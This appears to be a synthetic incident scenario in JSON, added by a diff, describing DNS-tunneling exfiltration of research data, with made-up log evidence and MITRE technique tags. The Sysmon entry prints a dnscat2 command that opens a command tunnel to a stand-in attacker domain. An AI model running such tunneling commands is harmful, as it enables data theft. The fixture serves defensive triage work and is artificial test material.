@@ -1,0 +1,47 @@
+{
+  "title": "Data Exfiltration via DNS Tunneling - Research Lab",
+  "description": "Sustained data exfiltration over DNS tunneling detected from Research & Development network. Internal database with proprietary formulas was accessed by a previously unknown device. Data encoded in DNS queries to a rogue nameserver. T1048.003 T1572 T1071.004",
+  "severity": "Critical",
+  "evidence": [
+    {
+      "source": "NetFlow Sensor",
+      "content": "Anomalous DNS query volume from 10.0.100.88 to 198.51.100.10: 47,000 queries in 2 hours. Average query length: 52 characters. High entropy subdomains. T1572 T1071.004",
+      "content_type": "network"
+    },
+    {
+      "source": "DNS Server Log",
+      "content": "NXDOMAIN responses for query patterns: aGVsbG8ud29ybGQuZXZpbC5jb20=.subdomain.exfil-server.com. Base64-decoded subdomains contain database column headers. T1048.003",
+      "content_type": "log"
+    },
+    {
+      "source": "DHCP Log",
+      "content": "IP 10.0.100.88 assigned to unknown MAC address 00:1B:44:11:3A:B7 - not in asset inventory. Vendor lookup: Raspberry Pi Foundation. T1200",
+      "content_type": "log"
+    },
+    {
+      "source": "Database Audit Log",
+      "content": "SELECT queries from 10.0.100.88 to postgresql://db-research-prod:5432/formulas_db. User: readonly_user. Queries: SELECT * FROM patents, SELECT * FROM chemical_formulas. 15,000 rows returned between 02:00-04:00 UTC. T1213",
+      "content_type": "log"
+    },
+    {
+      "source": "Authentication Log",
+      "content": "Service account readonly_user authenticated from 10.0.100.88 via certificate-based auth at 01:55 UTC. Certificate serial: 4E:7A:2F:1B:9C:33:88:DD. Subject: CN=research-readonly. T1078.004",
+      "content_type": "log"
+    },
+    {
+      "source": "Proxy Log",
+      "content": "HTTPS connection from 10.0.100.88 to 198.51.100.10:443. TLS certificate issued to *.exfil-server.com by Let's Encrypt. Certificate SHA256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b",
+      "content_type": "network"
+    },
+    {
+      "source": "Sysmon Event 1",
+      "content": "Process creation: dnscat2.exe -execute cmd -secret research2024 -dns exfil-server.com. Parent process: svchost.exe. Running on 10.0.100.88. T1572 T1095",
+      "content_type": "log"
+    },
+    {
+      "source": "Endpoint Detection",
+      "content": "Unknown USB device connected at 01:30 UTC. Serial: USB\\VID_1A86\\PID_7523\\20241234. Device description: USB-to-Serial adapter. Presumed Raspberry Pi Pico acting as drop-in tunneler. T1091 T1200",
+      "content_type": "log"
+    }
+  ]
+}
